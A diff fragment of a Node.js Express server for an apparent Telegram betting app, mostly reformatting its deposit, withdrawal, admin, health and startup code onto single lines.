       if (user.isBanned) return res.json({ success: false, banned: true, message: 'Banned' });
       user.lastActive = new Date(); await user.save();
     }
-    res.json({ success: true, user: {
-      id: user.telegramId, username: user.username, balance: user.balance,
-      totalDeposited: user.totalDeposited, totalWithdrawn: user.totalWithdrawn,
-    }});
-  } catch (err) { res.status(500).json({ success: false, message: 'Server error' }); }
+    res.json({ success: true, user: { id: user.telegramId, username: user.username, balance: user.balance, totalDeposited: user.totalDeposited, totalWithdrawn: user.totalWithdrawn } });
+  } catch { res.status(500).json({ success: false, message: 'Server error' }); }
 });
 
 app.post('/api/deposit', async (req, res) => {
   try {
     const { userId, username, name, phone, amount } = req.body;
-    if (!userId || !name || !phone || !amount || Number(amount) < 3000)
-      return res.status(400).json({ success: false, message: 'Invalid data or amount < 3000' });
+    if (!userId || !name || !phone || !amount || Number(amount) < 3000) return res.status(400).json({ success: false, message: 'Invalid data or amount < 3000' });
     await Transaction.create({ userId, username, type: 'deposit', amount: Number(amount), accountName: name, accountNumber: phone });
     res.json({ success: true });
   } catch { res.status(500).json({ success: false, message: 'Server error' }); }
@@ -789,16 +637,9 @@ app.post('/api/withdraw', async (req, res) => {
   try {
     const { userId, username, name, phone, amount } = req.body;
     const amt = Number(amount);
-    if (!userId || !name || !phone || !amt || amt <= 0)
-      return res.status(400).json({ success: false, message: 'Invalid data' });
-    if (amt < MIN_WITHDRAWAL)
-      return res.status(400).json({ success: false, message: `အနည်းဆုံး ${MIN_WITHDRAWAL.toLocaleString()} MMK ထုတ်ရမည်` });
-
-    const user = await User.findOneAndUpdate(
-      { telegramId: userId, balance: { $gte: amt } },
-      { $inc: { balance: -amt, totalWithdrawn: amt } },
-      { new: true }
-    );
+    if (!userId || !name || !phone || !amt || amt <= 0) return res.status(400).json({ success: false, message: 'Invalid data' });
+    if (amt < MIN_WITHDRAWAL) return res.status(400).json({ success: false, message: `အနည်းဆုံး ${MIN_WITHDRAWAL.toLocaleString()} MMK ထုတ်ရမည်` });
+    const user = await User.findOneAndUpdate({ telegramId: userId, balance: { $gte: amt } }, { $inc: { balance: -amt, totalWithdrawn: amt } }, { new: true });
     if (!user) {
       const ex = await User.findOne({ telegramId: userId });
       return res.status(400).json({ success: false, message: ex ? 'လက်ကျန်မလုံလောက်' : 'User not found' });
@@ -806,7 +647,7 @@ app.post('/api/withdraw', async (req, res) => {
     await Transaction.create({ userId, username, type: 'withdraw', amount: amt, accountName: name, accountNumber: phone });
     io.emit('balanceUpdate', { userId, balance: user.balance });
     res.json({ success: true, newBalance: user.balance });
-  } catch (err) { res.status(500).json({ success: false, message: 'Server error' }); }
+  } catch { res.status(500).json({ success: false, message: 'Server error' }); }
 });
 
 function adminGuard(req, res, next) {
@@ -815,14 +656,8 @@ function adminGuard(req, res, next) {
   next();
 }
 
-app.get('/api/admin/users',        adminGuard, async (req, res) => {
-  try { res.json({ success: true, users: await User.find().sort({ createdAt: -1 }).limit(200).lean() }); }
-  catch { res.status(500).json({ success: false }); }
-});
-app.get('/api/admin/transactions', adminGuard, async (req, res) => {
-  try { res.json({ success: true, transactions: await Transaction.find().sort({ createdAt: -1 }).limit(200).lean() }); }
-  catch { res.status(500).json({ success: false }); }
-});
+app.get('/api/admin/users',        adminGuard, async (req, res) => { try { res.json({ success: true, users: await User.find().sort({ createdAt: -1 }).limit(200).lean() }); } catch { res.status(500).json({ success: false }); } });
+app.get('/api/admin/transactions', adminGuard, async (req, res) => { try { res.json({ success: true, transactions: await Transaction.find().sort({ createdAt: -1 }).limit(200).lean() }); } catch { res.status(500).json({ success: false }); } });
 
 app.post('/api/admin/user/balance', adminGuard, async (req, res) => {
   try {
@@ -833,8 +668,7 @@ app.post('/api/admin/user/balance', adminGuard, async (req, res) => {
     if (action === 'add') {
       user = await User.findOneAndUpdate({ telegramId: userId }, { $inc: { balance: amt, totalDeposited: amt } }, { new: true });
     } else if (action === 'deduct') {
-      user = await User.findOneAndUpdate({ telegramId: userId, balance: { $gte: amt } },
-        { $inc: { balance: -amt, totalWithdrawn: amt } }, { new: true });
+      user = await User.findOneAndUpdate({ telegramId: userId, balance: { $gte: amt } }, { $inc: { balance: -amt, totalWithdrawn: amt } }, { new: true });
       if (!user) return res.status(400).json({ success: false, message: 'Insufficient' });
     } else return res.status(400).json({ success: false, message: 'Invalid action' });
     if (!user) return res.status(404).json({ success: false });
@@ -846,8 +680,7 @@ app.post('/api/admin/user/balance', adminGuard, async (req, res) => {
 app.post('/api/admin/user/ban', adminGuard, async (req, res) => {
   try {
     const { userId, ban, reason } = req.body;
-    const upd = ban ? { isBanned: true, banReason: reason || '', bannedAt: new Date() }
-                    : { isBanned: false, banReason: null, bannedAt: null };
+    const upd = ban ? { isBanned: true, banReason: reason || '', bannedAt: new Date() } : { isBanned: false, banReason: null, bannedAt: null };
     const user = await User.findOneAndUpdate({ telegramId: userId }, upd);
     if (!user) return res.status(404).json({ success: false });
     res.json({ success: true });
@@ -858,23 +691,21 @@ app.post('/api/admin/transaction/process', adminGuard, async (req, res) => {
   try {
     const { transactionId, status, adminNote } = req.body;
     const tx = await Transaction.findById(transactionId);
-    if (!tx)                    return res.status(404).json({ success: false, message: 'Not found' });
+    if (!tx)                     return res.status(404).json({ success: false, message: 'Not found' });
     if (tx.status !== 'pending') return res.status(400).json({ success: false, message: 'Already processed' });
     if (status === 'confirmed' && tx.type === 'deposit') {
-      const u = await User.findOneAndUpdate({ telegramId: tx.userId },
-        { $inc: { balance: tx.amount, totalDeposited: tx.amount } }, { new: true });
+      const u = await User.findOneAndUpdate({ telegramId: tx.userId }, { $inc: { balance: tx.amount, totalDeposited: tx.amount } }, { new: true });
       if (u) io.emit('balanceUpdate', { userId: tx.userId, balance: u.balance });
     }
     if (status === 'rejected' && tx.type === 'withdraw') {
-      const u = await User.findOneAndUpdate({ telegramId: tx.userId },
-        { $inc: { balance: tx.amount, totalWithdrawn: -tx.amount } }, { new: true });
+      const u = await User.findOneAndUpdate({ telegramId: tx.userId }, { $inc: { balance: tx.amount, totalWithdrawn: -tx.amount } }, { new: true });
       if (u) io.emit('balanceUpdate', { userId: tx.userId, balance: u.balance });
     }
     tx.status = status; tx.adminNote = adminNote || '';
     tx.confirmedBy = req.headers['x-telegram-id']; tx.confirmedAt = new Date();
     await tx.save();
     res.json({ success: true });
-  } catch (err) { res.status(500).json({ success: false }); }
+  } catch { res.status(500).json({ success: false }); }
 });
 
 app.get('/api/admin/house', adminGuard, (req, res) => {
@@ -886,16 +717,12 @@ app.post('/api/admin/house/balance', adminGuard, (req, res) => {
   houseBalance = amt;
   res.json({ success: true, houseBalance });
 });
-
-app.get('/health', (req, res) => res.json({
-  status: 'ok', phase: G.phase, round: roundCounter,
-  bots: BOT_POOL.size, db: dbReady, house: houseBalance,
-}));
+app.get('/health', (req, res) => res.json({ status: 'ok', phase: G.phase, round: roundCounter, bots: BOT_POOL.size, db: dbReady, house: houseBalance }));
 
 // ─── Start ────────────────────────────────────────────────────────────────────
 startGameLoop();
 if (process.env.BOT_TOKEN) {
-  bot.launch().then(() => console.log('🤖 Bot started')).catch(console.error);
+  bot.launch().then(() => console.log('🤖 Telegram Bot started')).catch(console.error);
 }
 const PORT = Number(process.env.PORT) || 3000;
 server.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
